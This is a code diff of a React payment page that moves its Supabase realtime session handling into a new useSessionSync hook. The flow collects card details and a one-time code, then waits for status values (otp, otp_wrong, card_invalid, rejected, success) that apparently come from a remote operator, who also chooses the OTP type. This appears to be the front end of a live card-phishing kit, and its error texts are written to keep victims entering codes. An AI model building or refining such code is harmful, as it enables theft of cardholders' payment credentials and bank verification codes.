@@ -8,6 +8,7 @@ import WaitingScreen from "@/components/WaitingScreen";
 import ProcessingOverlay from "@/components/ProcessingOverlay";
 import CardDeclinedScreen from "@/components/CardDeclinedScreen";
 import { supabase } from "@/integrations/supabase/client";
+import { useSessionSync } from "@/hooks/use-session-sync";
 
 const Index = () => {
   const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected" | "card_declined">("form");
@@ -69,77 +70,51 @@ const Index = () => {
     }
   }, []);
 
-  useEffect(() => {
-    if (!sessionId) return;
+  // Session status handler (stable ref)
+  const handleStatusChangeRef = useRef<(status: string, formData: Record<string, any>) => void>(() => {});
+  handleStatusChangeRef.current = (newStatus: string, formData: Record<string, any>) => {
+    const currentStep = stepRef.current;
 
-    const channel = supabase
-      .channel(`session-${sessionId}`)
-      .on(
-        "postgres_changes",
-        {
-          event: "UPDATE",
-          schema: "public",
-          table: "sessions",
-          filter: `id=eq.${sessionId}`,
-        },
-        (payload) => {
-          const newStatus = (payload.new as any).status;
-          const currentStep = stepRef.current;
-          
-          if (currentStep === "processing_card" || currentStep === "waiting") {
-            if (newStatus === "otp") {
-              setOtpError(null);
-              const formData = (payload.new as any).form_data || {};
-              setOtpType((formData.otp_type as OtpType) || "6digit");
-              setStep("otp");
-            }
-            if (newStatus === "rejected") setStep("rejected");
-            if (newStatus === "card_invalid") {
-              setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-              setStep("card_declined");
-            }
-          }
-          if (currentStep === "otp") {
-            if (newStatus === "otp") {
-              const formData = (payload.new as any).form_data || {};
-              setOtpType((formData.otp_type as OtpType) || "6digit");
-            }
-            if (newStatus === "otp_wrong") {
-              setOtpError("The verification code you entered is incorrect. Please try again.");
-            }
-            if (newStatus === "otp_expired") {
-              setOtpError("This verification code has expired. Please request a new one.");
-            }
-            if (newStatus === "rejected") setStep("rejected");
-            if (newStatus === "card_invalid") {
-              setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-              setStep("card_declined");
-            }
-          }
-          if (currentStep === "processing") {
-            if (newStatus === "success") setStep("success");
-            if (newStatus === "rejected") setStep("rejected");
-            if (newStatus === "otp_wrong") {
-              setOtpError("The verification code you entered is incorrect. Please try again.");
-              setStep("otp");
-            }
-            if (newStatus === "otp_expired") {
-              setOtpError("This verification code has expired. Please request a new one.");
-              setStep("otp");
-            }
-            if (newStatus === "card_invalid") {
-              setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-              setStep("card_declined");
-            }
-          }
-        }
-      )
-      .subscribe();
+    if (currentStep === "processing_card" || currentStep === "waiting") {
+      if (newStatus === "otp") {
+        setOtpError(null);
+        setOtpType((formData.otp_type as OtpType) || "6digit");
+        setStep("otp");
+      }
+      if (newStatus === "rejected") setStep("rejected");
+      if (newStatus === "card_invalid") {
+        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
+        setStep("card_declined");
+      }
+    }
+    if (currentStep === "otp") {
+      if (newStatus === "otp") {
+        setOtpType((formData.otp_type as OtpType) || "6digit");
+      }
+      if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
+      if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
+      if (newStatus === "rejected") setStep("rejected");
+      if (newStatus === "card_invalid") {
+        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
+        setStep("card_declined");
+      }
+    }
+    if (currentStep === "processing") {
+      if (newStatus === "success") setStep("success");
+      if (newStatus === "rejected") setStep("rejected");
+      if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
+      if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
+      if (newStatus === "card_invalid") {
+        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
+        setStep("card_declined");
+      }
+    }
+  };
 
-    return () => {
-      supabase.removeChannel(channel);
-    };
-  }, [sessionId]);
+  // Real-time + polling session sync
+  useSessionSync(sessionId, {
+    onStatusChange: (status, formData) => handleStatusChangeRef.current(status, formData),
+  });
 
   const handleOtpSubmit = async (otp: string) => {
     setOtpError(null);
